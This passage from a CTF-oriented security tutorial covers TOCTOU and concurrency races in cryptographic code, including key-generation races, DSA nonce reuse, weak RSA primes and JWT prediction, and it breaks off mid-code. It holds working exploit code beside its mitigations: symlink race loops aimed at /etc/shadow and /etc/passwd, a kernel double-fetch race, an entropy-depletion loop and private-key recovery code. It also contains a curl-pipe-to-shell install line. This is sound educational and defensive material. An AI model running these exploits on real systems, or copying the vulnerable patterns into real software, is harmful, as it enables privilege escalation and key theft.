# Complete UAF analysis toolkit
apt-get install gdb valgrind clang-tools gef pwndbg

# Install GEF (GDB Enhanced Features) for heap analysis
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# Install pwndbg (alternative to GEF)
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# Heap analysis in GDB with GEF
gdb ./program
gef> heap chunks
gef> heap bins
gef> search-pattern "key_pattern"
```

This completes the comprehensive coverage of Memory Management vulnerabilities in CTF cryptography contexts. The three subsections cover the primary ways memory mismanagement leads to cryptographic key exposure: plaintext storage, buffer overflows, and use-after-free conditions.

---

## Concurrency Issues

### TOCTOU (Time-of-Check Time-of-Use)

#### Fundamental Concepts

**TOCTOU definition:**

- Security vulnerability where system state changes between checking a condition (TOC) and using a resource (TOU)
- Window of vulnerability: Time gap between check and use operations
- Classic example: File system operations where file properties change between stat() and open()

**Attack vector requirements:**

- Multitasking or multiprocessing environment
- Shared resources accessible by attacker and victim
- Non-atomic check-then-use sequences
- Exploitable time window (microseconds to seconds)

**Vulnerability categories:**

- File system TOCTOU: Symlink races, file replacement
- Process state TOCTOU: Signal handlers, environment variables
- Memory TOCTOU: Shared memory, buffer modifications
- Cryptographic TOCTOU: Key/state changes during operations

#### File System TOCTOU Attacks

**Classic symlink race:**

**Vulnerable code pattern:**

```c
// VULNERABLE: Check-then-use pattern
if (access("/tmp/userfile", W_OK) == 0) {  // Check (TOC)
    sleep(1);  // Exaggerated window for demonstration
    int fd = open("/tmp/userfile", O_WRONLY);  // Use (TOU)
    write(fd, sensitive_data, size);
    close(fd);
}
```

**Exploitation technique:**

```bash
#!/bin/bash
# Exploit script: Replace file with symlink during race window

TARGET="/tmp/userfile"
VICTIM_FILE="/etc/shadow"

# Create initial file
touch $TARGET

# Run in loop to win race
while true; do
    rm -f $TARGET
    ln -s $VICTIM_FILE $TARGET
    rm -f $TARGET
    touch $TARGET
done
```

**Detection in CTF scenarios:**

```bash
# Identify TOCTOU vulnerabilities in binaries
# Look for: access(), stat(), lstat() followed by open(), chmod(), chown()

# Using ltrace to trace library calls
ltrace -f -e access,open,stat ./vulnerable_binary

# Using strace for syscall tracing
strace -f -e trace=access,open,stat,lstat ./vulnerable_binary

# Look for time gaps between check and use
strace -f -T -e trace=access,open ./vulnerable_binary
```

**Common vulnerable functions:**

- `access()` / `stat()` followed by `open()` / `fopen()`
- `lstat()` followed by `open()` / `unlink()`
- `stat()` followed by `chmod()` / `chown()`
- `readlink()` followed by operations on target

#### Advanced File System TOCTOU

**Directory traversal race:**

```c
// VULNERABLE: Check directory then operate on file
if (S_ISDIR(stat_buf.st_mode)) {  // Check if directory
    // Attacker can replace directory with symlink here
    chdir("/tmp/userdir");  // Change to directory
    fd = open("sensitive_file", O_RDWR);  // Open file in "directory"
}
```

**Exploitation:**

```bash
#!/bin/bash
# Race to replace directory with symlink to /root

while true; do
    rm -rf /tmp/userdir
    mkdir /tmp/userdir
    rm -rf /tmp/userdir
    ln -s /root /tmp/userdir
done
```

**Temporary file races:**

**mktemp() race conditions:**

```c
// VULNERABLE: Deprecated mktemp() function
char template[] = "/tmp/fileXXXXXX";
mktemp(template);  // Creates predictable name, doesn't create file
// Race window here - attacker can create file/symlink
int fd = open(template, O_WRONLY | O_CREAT, 0600);
```

**Secure alternative:**

```c
// SECURE: mkstemp() atomically creates file
char template[] = "/tmp/fileXXXXXX";
int fd = mkstemp(template);  // Atomic creation with O_EXCL
if (fd == -1) {
    perror("mkstemp");
    exit(1);
}
// File is safely created, no race window
```

**Detection commands:**

```bash
# Find programs using vulnerable mktemp()
grep -r "mktemp" /path/to/source/

# Check for tempnam(), tmpnam() usage
grep -rE "(tempnam|tmpnam|mktemp)\(" /path/to/source/

# Binary analysis for unsafe temp file functions
objdump -d binary | grep -A5 "mktemp"
```

#### Filesystem Hardlink/Symlink Exploitation

**Hardlink attack on setuid binaries:**

```bash
# Create hardlink to setuid binary
ln /usr/bin/passwd /tmp/my_passwd

# If vulnerable program checks /tmp/my_passwd identity
# but later executes it, privilege escalation possible

# Example: Program checks owner of /tmp/my_passwd (shows root)
# then executes it with elevated privileges
```

**Symlink attack patterns:**

**Pattern 1: Symlink to privileged file:**

```bash
# Create symlink to target
ln -s /etc/shadow /tmp/userfile

# Wait for privileged program to write to /tmp/userfile
# Result: /etc/shadow gets written/overwritten
```

**Pattern 2: Directory symlink:**

```bash
# Replace directory with symlink
rm -rf /tmp/safe_dir
ln -s /etc /tmp/safe_dir

# Program operates on /tmp/safe_dir/config
# Actually modifies /etc/config
```

**Protection bypass attempts:**

```bash
# If program checks symlink with lstat()
# Race condition: Replace regular file with symlink after lstat()

# Exploitation loop
while true; do
    touch /tmp/target
    rm /tmp/target
    ln -s /etc/passwd /tmp/target
done &

# Run vulnerable program repeatedly
while true; do
    ./vulnerable_program /tmp/target
done
```

#### Process and Signal TOCTOU

**Environment variable TOCTOU:**

**Vulnerable pattern:**

```c
// VULNERABLE: Check environment then use
if (getenv("SAFE_MODE") == NULL) {  // Check
    // Attacker could modify environment here in some scenarios
    if (getenv("SAFE_MODE") == NULL) {  // Use
        perform_dangerous_operation();
    }
}
```

**Signal handler race conditions:**

```c
// VULNERABLE: Global state modified by signal handler
volatile sig_atomic_t flag = 0;

void handler(int sig) {
    flag = 1;
}

int main() {
    signal(SIGUSR1, handler);
    
    if (flag == 0) {  // Check
        // Signal could arrive here
        perform_secure_operation();  // Use
        // Assumption flag==0 violated if signal arrives
    }
}
```

**Exploitation considerations:**

- [Inference] Signal delivery timing varies by kernel scheduler
- Race window typically nanoseconds to milliseconds
- May require repeated attempts (10,000+) to win race

#### Memory-Based TOCTOU

**Shared memory race conditions:**

**Vulnerable pattern:**

```c
// VULNERABLE: Check shared memory then use
struct shared_data *shm = get_shared_memory();

if (shm->validated == 1) {  // Check in shared memory
    // Attacker process can modify shm->validated here
    if (shm->user_id == TRUSTED_UID) {  // Another check
        // Attacker could modify shm->user_id here
        grant_access(shm->user_id);  // Use potentially modified data
    }
}
```

**Exploitation technique:**

```c
// Attacker process running concurrently
struct shared_data *shm = get_shared_memory();

while (1) {
    shm->validated = 1;
    shm->user_id = TRUSTED_UID;
    // Brief valid state for victim to check
    
    usleep(1);  // Microsecond timing
    
    shm->validated = 0;
    shm->user_id = ATTACKER_UID;
}
```

**Double-fetch vulnerabilities (kernel context):**

**Vulnerable kernel code pattern:**

```c
// VULNERABLE: Fetch from userspace twice
int vulnerable_syscall(struct user_data __user *udata) {
    int size;
    
    // First fetch: Check size
    if (copy_from_user(&size, &udata->size, sizeof(int)))
        return -EFAULT;
    
    if (size > MAX_SIZE)
        return -EINVAL;
    
    // Userspace can modify udata->size here
    
    // Second fetch: Use size for allocation
    if (copy_from_user(&size, &udata->size, sizeof(int)))
        return -EFAULT;
    
    // size could now be > MAX_SIZE
    char *buf = kmalloc(size, GFP_KERNEL);  // Potential overflow
}
```

**Exploitation:**

```c
// Userspace exploit
struct user_data data;
data.size = MAX_SIZE - 1;  // Valid size initially

// Thread 1: Make syscall
pthread_create(&t1, NULL, make_syscall, &data);

// Thread 2: Race to modify size
while (1) {
    data.size = HUGE_SIZE;  // Try to make second fetch see large size
    usleep(1);
    data.size = MAX_SIZE - 1;
}
```

#### TOCTOU in Cryptographic Operations

**Key validation race:**

**Vulnerable pattern:**

```c
// VULNERABLE: Check key validity then use
if (validate_key(key_handle)) {  // Check
    // Key could be revoked/replaced here
    result = encrypt_data(data, key_handle);  // Use
}
```

**Certificate validation TOCTOU:**

```c
// VULNERABLE: Validate certificate then use
X509 *cert = load_certificate(cert_path);

if (verify_certificate(cert)) {  // Check certificate validity
    // Certificate file could be replaced here
    X509 *cert2 = load_certificate(cert_path);  // Load again
    perform_trusted_operation(cert2);  // Use potentially different cert
}
```

**Session token race:**

```python
# VULNERABLE: Check session then use
def process_request(session_id):
    if is_session_valid(session_id):  # Check
        # Session could expire or be invalidated here
        user = get_session_user(session_id)  # Use
        return sensitive_data_for(user)
```

**Exploitation scenario:**

```python
# Attacker invalidates session during race window
import threading
import time

def invalidate_session():
    while True:
        logout(session_id)
        time.sleep(0.001)

def exploit():
    t = threading.Thread(target=invalidate_session)
    t.start()
    
    # Repeatedly try to win race
    for i in range(10000):
        try:
            data = process_request(session_id)
            if data:
                print(f"Won race! Got data: {data}")
                break
        except:
            pass
```

#### Detection and Analysis Techniques

**Static analysis for TOCTOU:**

**Using grep patterns:**

```bash
# Find potential TOCTOU patterns in C code
# Check-then-use with file operations
grep -n "access\|stat\|lstat" source.c | \
    while read line; do
        linenum=$(echo $line | cut -d: -f1)
        # Check next 10 lines for open/chmod/chown
        sed -n "${linenum},$((linenum+10))p" source.c | \
            grep -E "open\|fopen\|chmod\|chown" && echo "Potential TOCTOU at line $linenum"
    done

# Find mktemp() usage
grep -rn "mktemp(" --include="*.c" /path/to/source/
```

**Using semgrep for pattern matching:**

```bash
# Install semgrep
pip3 install semgrep

# Create rule file toctou.yaml
cat > toctou.yaml << 'EOF'
rules:
  - id: toctou-file-access
    pattern: |
      access($PATH, ...)
      ...
      open($PATH, ...)
    message: "Potential TOCTOU: access() followed by open()"
    languages: [c]
    severity: WARNING
EOF

# Run analysis
semgrep --config toctou.yaml /path/to/source/
```

**Dynamic analysis with race detectors:**

**Using Thread Sanitizer (TSan):**

```bash
# Compile with TSan
gcc -fsanitize=thread -g program.c -o program

# Run program
./program

# TSan will report data races
# Look for: "WARNING: ThreadSanitizer: data race"
```

**Using Helgrind (Valgrind tool):**

```bash
# Run with Helgrind
valgrind --tool=helgrind ./program

# Reports potential race conditions
# Look for: "Possible data race during write"
```

**Using strace with timing:**

```bash
# Trace syscalls with timestamps and duration
strace -tt -T -f -e trace=access,open,stat,lstat ./program 2>&1 | \
    awk '/access.*return/ { check=$1; path=$2 } 
         /open.*return/ { 
             if ($2 == path) 
                 print "TOCTOU candidate:", check, "->", $1, "gap:", $1-check, "path:", path 
         }'
```

#### Exploitation Tools and Techniques

**Automated race condition exploitation:**

**Using inotify for precise timing:**

```c
// Monitor file system events for precise attack timing
#include <sys/inotify.h>

int fd = inotify_init();
int wd = inotify_add_watch(fd, "/tmp/target", IN_ACCESS | IN_OPEN);

// Wait for victim to check file
char buf[4096];
read(fd, buf, sizeof(buf));
struct inotify_event *event = (struct inotify_event *)buf;

if (event->mask & IN_ACCESS) {
    // Victim just checked file with access()
    // Replace with symlink NOW
    unlink("/tmp/target");
    symlink("/etc/shadow", "/tmp/target");
}
```

**Brute force race winning:**

```bash
#!/bin/bash
# Repeatedly attempt to win race condition

TARGET="/tmp/race_target"
MALICIOUS="/etc/passwd"

for i in {1..100000}; do
    # Create legitimate file
    echo "safe content" > $TARGET
    
    # In background, wait tiny amount then replace
    (sleep 0.00001; rm $TARGET; ln -s $MALICIOUS $TARGET) &
    
    # Trigger victim program
    ./victim_program $TARGET
    
    # Check if exploit succeeded
    if grep "attacker" /etc/passwd 2>/dev/null; then
        echo "Race won on attempt $i"
        exit 0
    fi
    
    # Cleanup
    rm -f $TARGET
done
```

**Using userfaultfd for kernel races:**

```c
// Advanced technique for controlling page faults
// Useful for double-fetch kernel exploits
#include <linux/userfaultfd.h>

int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
struct uffdio_api uffdio_api = { .api = UFFDIO_API };
ioctl(uffd, UFFDIO_API, &uffdio_api);

// Register memory region
struct uffdio_register uffdio_register;
uffdio_register.range.start = (unsigned long)mmap_addr;
uffdio_register.range.len = page_size;
uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
ioctl(uffd, UFFDIO_REGISTER, &uffdio_register);

// Handle page faults to control race timing
// [Inference] Allows precise control of kernel's access to userspace memory
```

#### Mitigation and Secure Coding

**Atomic operations:**

**Using O_EXCL for exclusive creation:**

```c
// SECURE: Atomic file creation
int fd = open("/tmp/userfile", O_WRONLY | O_CREAT | O_EXCL, 0600);
if (fd == -1) {
    if (errno == EEXIST) {
        fprintf(stderr, "File already exists - potential attack\n");
    }
    exit(1);
}
// File created atomically, no TOCTOU window
```

**Using openat() with directory fd:**

```c
// SECURE: Operate relative to directory file descriptor
int dirfd = open("/safe/directory", O_RDONLY | O_DIRECTORY);
if (dirfd == -1) {
    perror("open directory");
    exit(1);
}

// Now operate relative to dirfd - prevents directory replacement races
int fd = openat(dirfd, "relative/path/file", O_RDONLY);
fstatat(dirfd, "relative/path/file", &st, 0);
```

**Using O_NOFOLLOW:**

```c
// SECURE: Fail if path is symlink
int fd = open("/tmp/userfile", O_RDONLY | O_NOFOLLOW);
if (fd == -1) {
    if (errno == ELOOP) {
        fprintf(stderr, "Symlink detected - potential attack\n");
    }
    exit(1);
}
```

**File locking mechanisms:**

**Using flock():**

```c
// Lock file before operations
int fd = open("/tmp/userfile", O_RDWR);
if (flock(fd, LOCK_EX) == -1) {  // Exclusive lock
    perror("flock");
    exit(1);
}

// Perform operations while locked
// Other processes blocked from accessing

flock(fd, LOCK_UN);  // Unlock
close(fd);
```

**Using fcntl() advisory locks:**

```c
// More portable locking
struct flock fl = {
    .l_type = F_WRLCK,    // Write lock
    .l_whence = SEEK_SET,
    .l_start = 0,
    .l_len = 0           // Lock entire file
};

if (fcntl(fd, F_SETLKW, &fl) == -1) {  // Wait for lock
    perror("fcntl");
    exit(1);
}

// Operations while locked

fl.l_type = F_UNLCK;
fcntl(fd, F_SETLK, &fl);  // Unlock
```

**Capability-based security:**

```c
// Use file descriptor capabilities instead of paths
int safe_operation(int fd) {
    // Operate on already-opened fd
    // No path-based TOCTOU possible
    struct stat st;
    if (fstat(fd, &st) == -1)  // Use fstat() not stat()
        return -1;
    
    // Verify fd properties
    if (st.st_uid != getuid())
        return -1;
    
    return write(fd, data, size);  // Safe write to fd
}
```

### Race Conditions in Key Generation

#### Cryptographic RNG State Races

**PRNG state corruption:**

**Vulnerable pattern:**

```c
// VULNERABLE: Non-thread-safe PRNG state
static unsigned int rng_state = 0;

int weak_rand() {
    rng_state = (rng_state * 1103515245 + 12345) & 0x7fffffff;
    return rng_state;
}

void generate_key() {
    for (int i = 0; i < KEY_SIZE; i++) {
        key[i] = weak_rand() & 0xFF;  // Race if multiple threads call this
    }
}
```

**Exploitation scenario:**

```c
// Multiple threads generating keys concurrently
pthread_t threads[10];
for (int i = 0; i < 10; i++) {
    pthread_create(&threads[i], NULL, generate_key_thread, NULL);
}

// Result: rng_state corrupted by concurrent access
// Keys may overlap, have reduced entropy, or be predictable
```

**Detection in binaries:**

```bash
# Look for non-thread-safe random functions
objdump -d binary | grep -E "rand@plt|random@plt"

# Check for locking around RNG calls
objdump -d binary | grep -B5 -A5 "rand@plt" | grep -E "lock|mutex"

# Using ltrace to see concurrent RNG calls
ltrace -f ./binary 2>&1 | grep "rand"
```

#### Entropy Pool Depletion Races

**Linux /dev/random exhaustion:**

**Vulnerable pattern:**

```c
// VULNERABLE: Multiple processes draining entropy
int fd = open("/dev/random", O_RDONLY);  // Blocks when entropy low
read(fd, key_material, 32);  // May block or return weak data

// If multiple processes do this concurrently:
// - Entropy pool depletes rapidly
// - Keys generated with insufficient entropy
// - Potential correlation between keys
```

**Attack scenario:**

```bash
#!/bin/bash
# Deplete system entropy pool

while true; do
    # Rapidly consume entropy
    dd if=/dev/random of=/dev/null bs=1024 count=100 2>/dev/null &
done

# Victim process generating keys now gets:
# - Blocked on /dev/random (DoS)
# - OR falls back to weak PRNG
# - OR uses /dev/urandom with depleted entropy
```

**Entropy monitoring:**

```bash
# Check available entropy
cat /proc/sys/kernel/random/entropy_avail

# Watch entropy in real-time
watch -n 0.1 cat /proc/sys/kernel/random/entropy_avail

# Log entropy pool reads
strace -e trace=open,read -f -p $(pgrep target_process) 2>&1 | grep "/dev/random"
```

**Testing /dev/urandom quality under load:**

```bash
#!/bin/bash
# Test if /dev/urandom quality degrades under concurrent load

# Start entropy depletion
for i in {1..100}; do
    dd if=/dev/random of=/dev/null bs=1M 2>/dev/null &
done

# Generate test keys
for i in {1..1000}; do
    dd if=/dev/urandom of=key_$i.bin bs=32 count=1 2>/dev/null
done

# Analyze for patterns (should show high entropy)
ent key_*.bin | grep "Entropy"
```

#### Concurrent Key Generation Collisions

**Insufficient key space separation:**

**Vulnerable pattern:**

```python
# VULNERABLE: Time-based key generation without process isolation
import time
import hashlib

def generate_key():
    timestamp = int(time.time())  # Second precision
    return hashlib.sha256(str(timestamp).encode()).digest()

# Multiple processes calling this simultaneously generate same key
```

**Exploitation:**

```python
# Predict key generation timing
import multiprocessing
import time

def generate_key_at_time(t):
    while int(time.time()) != t:
        pass
    key = generate_key()
    return key

# Launch multiple processes at same second
with multiprocessing.Pool(10) as pool:
    target_time = int(time.time()) + 2
    keys = pool.map(generate_key_at_time, [target_time] * 10)

# All processes generate identical keys
print(f"Unique keys: {len(set(keys))}")  # Should be 1
```

**PID/TID-based seed collision:**

**Vulnerable pattern:**

```c
// VULNERABLE: PID as seed is predictable
void generate_key() {
    srand(getpid());  // PIDs are sequential and predictable
    for (int i = 0; i < KEY_SIZE; i++) {
        key[i] = rand() & 0xFF;
    }
}
```

**Exploitation:**

```c
// Predict victim PID and pre-compute keys
#include <sys/types.h>
#include <unistd.h>

// Observe victim PIDs
// PIDs are sequential: if victim is at PID 1234, next fork likely 1235, 1236...

for (int pid = 1200; pid < 1300; pid++) {
    srand(pid);
    unsigned char predicted_key[KEY_SIZE];
    for (int i = 0; i < KEY_SIZE; i++) {
        predicted_key[i] = rand() & 0xFF;
    }
    // Store predicted keys for brute force
}
```

#### Atomic Key Generation Primitives

**Using getrandom() system call:**

```c
// SECURE: Thread-safe, fork-safe random bytes
#include <sys/random.h>

ssize_t getrandom(void *buf, size_t buflen, unsigned int flags) {
    // flags: 0 (may block), GRND_NONBLOCK, GRND_RANDOM
}

// Generate key material
unsigned char key[32];
if (getrandom(key, sizeof(key), 0) != sizeof(key)) {
    fprintf(stderr, "getrandom failed\n");
    exit(1);
}
// Thread-safe, fork-safe, cryptographically secure
```

**Using OpenSSL thread-safe API:**

```c
// SECURE: OpenSSL handles internal locking
#include <openssl/rand.h>

unsigned char key[32];
if (RAND_bytes(key, sizeof(key)) != 1) {
    fprintf(stderr, "RAND_bytes failed\n");
    ERR_print_errors_fp(stderr);
    exit(1);
}
// Thread-safe by default in OpenSSL 1.1.0+
```

**Python secrets module:**

```python
# SECURE: Thread-safe cryptographic randomness
import secrets

# Generate key
key = secrets.token_bytes(32)  # 256-bit key

# Generate token
token = secrets.token_urlsafe(32)  # Base64-encoded

# secrets module uses os.urandom() which is thread-safe
```

#### OpenSSL-Specific Race Conditions

**Pre-1.1.0 thread safety issues:**

**Vulnerable pattern (OpenSSL < 1.1.0):**

```c
// VULNERABLE: OpenSSL pre-1.1.0 requires manual locking setup
#include <openssl/crypto.h>
#include <pthread.h>

// Without this setup, concurrent SSL operations race:
// - PRNG state corruption
// - Memory corruption in SSL structures
// - Key generation produces weak keys

// [Unverified] Required callback setup:
pthread_mutex_t *mutex_buf = NULL;

void locking_function(int mode, int n, const char *file, int line) {
    if (mode & CRYPTO_LOCK)
        pthread_mutex_lock(&mutex_buf[n]);
    else
        pthread_mutex_unlock(&mutex_buf[n]);
}

void setup_openssl_threads() {
    mutex_buf = malloc(CRYPTO_num_locks() * sizeof(pthread_mutex_t));
    for (int i = 0; i < CRYPTO_num_locks(); i++)
        pthread_mutex_init(&mutex_buf[i], NULL);
    
    CRYPTO_set_locking_callback(locking_function);
}
```

**Detection:**

```bash
# Check OpenSSL version in binary
strings binary | grep "OpenSSL"

# Check for thread setup callbacks
objdump -d binary | grep -E "CRYPTO_set_locking_callback|CRYPTO_THREADID_set_callback"

# If these are missing and program is threaded, likely vulnerable
```

**RAND_seed() races:**

```c
// VULNERABLE: Non-atomic seeding
void thread_init() {
    unsigned char seed[32];
    read_from_hardware_rng(seed, sizeof(seed));
    RAND_seed(seed, sizeof(seed));  // Race if multiple threads call this
}
```

#### DSA/ECDSA Nonce Reuse via Race

**Nonce generation race:**

**Vulnerable pattern:**

```c
// VULNERABLE: Shared nonce generator state
static int nonce_counter = 0;  // Global counter

BIGNUM *generate_nonce() {
    // Race condition: multiple threads increment counter
    nonce_counter++;  // Non-atomic increment
    return BN_new_from_int(nonce_counter);
}

void sign_message(const unsigned char *msg, size_t len) {
    BIGNUM *k = generate_nonce();  // k could collide across threads
    // Perform DSA/ECDSA signature with k
    // If k reused: private key recovery possible
}
```

**Exploitation consequences:**

- Two signatures with same nonce k reveal private key
- DSA: `k = (H(m1) - H(m2)) / (s1 - s2) mod q`
- Private key: `x = (s*k - H(m)) / r mod q`

**Detection of nonce reuse:**

```python
# Analyze signature pairs for nonce reuse
def check_nonce_reuse(signatures):
    # signatures: list of (r, s, message) tuples
    r_values = {}
    
    for r, s, msg in signatures:
        if r in r_values:
            print(f"Nonce reuse detected!")
            print(f"  Signature 1: {r_values[r]}")
            print(f"  Signature 2: {(r, s, msg)}")
            return True
        r_values[r] = (r, s, msg)
    
    return False

# In ECDSA/DSA, r = g^k mod p, so same k produces same r
```

**Key recovery from nonce reuse:**

```python
# Recover private key from two signatures with same nonce
def recover_private_key(r, s1, s2, h1, h2, q):
    """
    r: shared r value (same nonce used)
    s1, s2: signature s values
    h1, h2: message hashes
    q: curve order
    """
    # Calculate nonce: k = (h1 - h2) / (s1 - s2) mod q
    k = ((h1 - h2) * pow(s1 - s2, -1, q)) % q
    
    # Calculate private key: x = (s*k - h) / r mod q
    x = ((s1 * k - h1) * pow(r, -1, q)) % q
    
    return x
```

#### RSA Key Generation Races

**Prime generation collision:**

**Vulnerable pattern:**

```c
// VULNERABLE: Concurrent prime generation with poor RNG
BIGNUM *generate_prime(int bits) {
    BIGNUM *candidate = BN_new();
    
    // If RNG state races, multiple threads may generate same candidate
    BN_rand(candidate, bits, BN_RAND_TOP_TWO, BN_RAND_BOTTOM_ODD);
    
    while (!BN_is_prime_ex(candidate, BN_prime_checks, NULL, NULL)) {
        BN_add_word(candidate, 2);  // Try next odd number
    }
    
    return candidate;
}

// Multiple threads generating RSA keys concurrently
// May generate same primes -> identical moduli -> key compromise
```

**Exploitation scenario:**

```c
// Generate multiple RSA keys concurrently
pthread_t threads[100];
RSA *keys[100];

for (int i = 0; i < 100; i++) {
    pthread_create(&threads[i], NULL, generate_rsa_key_thread, &keys[i]);
}

// Check for shared primes
for (int i = 0; i < 100; i++) {
    for (int j = i+1; j < 100; j++) {
        BIGNUM *gcd = BN_new();
        BN_gcd(gcd, keys[i]->n, keys[j]->n, ctx);
        
        if (BN_cmp(gcd, BN_value_one()) != 0) {
            printf("Shared prime found between key %d and %d!\n", i, j);
            // Can factor both moduli and recover private keys
        }
    }
}
```

**Batch GCD attack on weak keys:**

```python
def batch_gcd(moduli):
    """
    Find shared factors among many RSA moduli efficiently.

    Parameters
    ----------
    moduli : list[int]
        List of RSA moduli (n values).

    Returns
    -------
    dict[int, int]
        Mapping of {modulus: shared_factor}, where shared_factor > 1.
    """
    from math import gcd
    from functools import reduce

    # Product tree approach - O(n log² n) instead of O(n²)
    shared_factors = {}

    # Compute product of all moduli
    product = reduce(lambda x, y: x * y, moduli, 1)

    # Check each modulus for shared factors
    for n in moduli:
        # Compute gcd(n, product/n)
        g = gcd(n, product // n)
        if g != 1 and g != n:
            shared_factors[n] = g
            print(f"Found shared factor {g} in modulus {n}")

    return shared_factors


# [Inference] This technique has been used to detect weak RSA keys sharing primes in public datasets.
# Example usage (for educational / security auditing purposes):
# moduli = [n1, n2, n3, ...]
# results = batch_gcd(moduli)
# print(results)
````

#### Timing-Based Race Exploitation

**Microsecond timing attacks:**

**Exploitation framework:**
```c
// High-precision timing for race exploitation
#include <time.h>

struct timespec start, end;

void precise_race_exploit() {
    // Create victim file at precise moment
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    // Fork child to replace file
    if (fork() == 0) {
        // Child: wait for exact timing
        struct timespec now;
        do {
            clock_gettime(CLOCK_MONOTONIC, &now);
        } while ((now.tv_sec - start.tv_sec) * 1000000000 + 
                 (now.tv_nsec - start.tv_nsec) < 500);  // 500ns delay
        
        // Replace file with symlink
        unlink("/tmp/target");
        symlink("/etc/shadow", "/tmp/target");
        exit(0);
    }
    
    // Parent: trigger victim immediately
    trigger_victim_program("/tmp/target");
}
````

**Scheduler manipulation:**

```c
// Influence scheduler to increase race win probability
#include <sched.h>

void optimize_for_race() {
    // Set real-time priority for attacker thread
    struct sched_param param;
    param.sched_priority = sched_get_priority_max(SCHED_FIFO);
    
    if (sched_setscheduler(0, SCHED_FIFO, &param) == -1) {
        perror("sched_setscheduler");
        // Fallback: nice value manipulation
        nice(-20);  // Highest priority (requires privileges)
    }
    
    // Pin to specific CPU core
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);
}
```

**CPU affinity for deterministic timing:**

```bash
# Pin processes to specific cores for timing control
taskset -c 0 ./attacker_process &
taskset -c 1 ./victim_process &

# This creates more deterministic race conditions
# Attacker and victim on different cores with predictable scheduling
```

#### JWT/Token Generation Races

**Timestamp collision in tokens:**

**Vulnerable pattern:**

```python
# VULNERABLE: Second-precision timestamp allows collision
import time
import jwt

def generate_token(user_id):
    payload = {
        'user_id': user_id,
        'iat': int(time.time()),  # Issued at - second precision
        'exp': int(time.time()) + 3600  # Expires in 1 hour
    }
    return jwt.encode(payload, SECRET_KEY, algorithm='HS256')

# Multiple requests in same second generate predictable tokens
```

**Exploitation:**

```python
# Brute force token by predicting timestamp
import jwt
import time

def predict_token(user_id, target_timestamp):
    # If we know victim generated token at target_timestamp
    payload = {
        'user_id': user_id,
        'iat': target_timestamp,
        'exp': target_timestamp + 3600
    }
    
    # Try to guess SECRET_KEY or exploit weak key
    for candidate_key in weak_key_wordlist:
        try:
            token = jwt.encode(payload, candidate_key, algorithm='HS256')
            # Try token against application
            if test_token(token):
                print(f"Valid token found with key: {candidate_key}")
                return token
        except:
            pass

# If timestamp is predictable and key is weak, token can be forged
```

**Nonce/jti collision:**

```python
# VULNERABLE: Insufficient jti (JWT ID) randomness
import random

def generate_token_with_jti(user_id):
    # Weak RNG seeded with time
    random.seed(int(time.time()))
    jti = random.randint(0, 999999)  # Only ~1 million possibilities
    
    payload = {
        'user_id': user_id,
        'jti': jti,
        'iat': int(time.time())
    }
    return jwt.encode(payload, SECRET_KEY, algorithm='HS256')

# Concurrent token generation may produce duplicate jti values
# If jti is used for replay protection, collision allows replay
```

#### Session Key Derivation Races

**Key derivation with shared state:**

**Vulnerable pattern:**

```c
// VULNERABLE: Shared counter in key derivation
static uint64_t key_derivation_counter = 0;

void derive_session_key(unsigned char *output) {
    unsigned char input[40];
    
    // Master secret + counter
    memcpy(input, master_secret, 32);
    
    // Race: counter read and increment not atomic
    uint64_t counter = key_derivation_counter;  // Read
    key_derivation_counter++;  // Increment
    
    memcpy(input + 32, &counter, 8);
    
    SHA256(input, 40, output);
}

// Multiple threads may use same counter value
// Results in identical session keys -> session hijacking
```

**Secure alternative:**

```c
// SECURE: Atomic counter operations
#include <stdatomic.h>

static atomic_uint_fast64_t key_derivation_counter = ATOMIC_VAR_INIT(0);

void derive_session_key_secure(unsigned char *output) {
    unsigned char input[40];
    memcpy(input, master_secret, 32);
    
    // Atomic increment and fetch
    uint64_t counter = atomic_fetch_add(&key_derivation_counter, 1);
    
    memcpy(input + 32, &counter, 8);
    SHA256(input, 40, output);
}
```

#### Diffie-Hellman Parameter Races

**Concurrent DH key exchange:**

**Vulnerable pattern:**

```c
// VULNERABLE: Shared DH parameters without locking
DH *dh_params = NULL;

void init_dh_params() {
    if (dh_params == NULL) {  // Check
        // Race window: multiple threads may pass check
        dh_params = DH_new();  // Use
        DH_generate_parameters_ex(dh_params, 2048, DH_GENERATOR_2, NULL);
    }
}

void establish_session() {
    init_dh_params();  // Multiple threads call this
    
    // Generate keypair
    DH_generate_key(dh_params);  // Race if dh_params modified concurrently
    
    // Compute shared secret
    unsigned char secret[256];
    DH_compute_key(secret, peer_pubkey, dh_params);
}
```

**Exploitation consequences:**

- Corrupted DH parameters -> weak shared secrets
- Parameter confusion -> wrong shared secret computation
- Memory corruption in DH structure

**Secure alternative with mutex:**

```c
// SECURE: Proper initialization with locking
#include <pthread.h>

static DH *dh_params = NULL;
static pthread_mutex_t dh_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_once_t dh_init_once = PTHREAD_ONCE_INIT;

void init_dh_params_once() {
    dh_params = DH_new();
    DH_generate_parameters_ex(dh_params, 2048, DH_GENERATOR_2, NULL);
}

void establish_session_secure() {
    // Ensure initialization happens exactly once
    pthread_once(&dh_init_once, init_dh_params_once);
    
    // Create per-session DH key
    DH *session_dh = DHparams_dup(dh_params);
    DH_generate_key(session_dh);
    
    // Compute shared secret
    unsigned char secret[256];
    DH_compute_key(secret, peer_pubkey, session_dh);
    
    DH_free(session_dh);
}
```

#### Hardware RNG Race Conditions

**/dev/hwrng access races:**

**Vulnerable pattern:**

```c
// VULNERABLE: Concurrent access to hardware RNG without proper buffering
int fd = open("/dev/hwrng", O_RDONLY);

void generate_key() {
    unsigned char key[32];
    
    // Multiple threads reading concurrently
    ssize_t n = read(fd, key, sizeof(key));
    
    // Issues:
    // - Reads may interleave (thread A gets bytes 0-15, thread B gets 16-31)
    // - Partial reads not handled
    // - No verification of read completion
}
```

**Race detection:**

```bash
# Monitor concurrent hwrng access
lsof | grep hwrng

# Trace hwrng reads with timing
strace -tt -T -e trace=open,read -f ./program 2>&1 | grep hwrng

# Check for interleaved reads (multiple PIDs/TIDs accessing same fd)
```

**TPM race conditions:**

**Vulnerable pattern:**

```c
// VULNERABLE: Concurrent TPM operations
#include <tss2/tss2_esys.h>

